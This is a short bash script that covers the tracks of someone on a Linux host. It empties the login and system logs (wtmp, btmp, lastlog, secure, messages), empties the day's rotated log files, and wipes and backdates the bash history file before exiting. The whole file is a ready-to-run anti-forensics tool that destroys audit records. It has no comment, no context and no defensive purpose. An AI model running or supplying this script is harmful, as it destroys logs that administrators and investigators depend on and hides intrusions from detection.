SINGLE_FILE(){
  >/var/log/wtmp;
  >/var/log/btmp;
  >/var/log/lastlog;
  >/var/log/secure;
  >/var/log/messages;
}

MULTIPLE_FILE(){
  for i in /var/log/*$(date +"%Y%m%d"); do
    >$i;
  done;
}

BASH_HISTORY(){
  history -c && history -w && >~/.bash_history && touch -d "1970-1-1" ~/.bash_history
}

SINGLE_FILE && MULTIPLE_FILE && BASH_HISTORY && history -c && exit
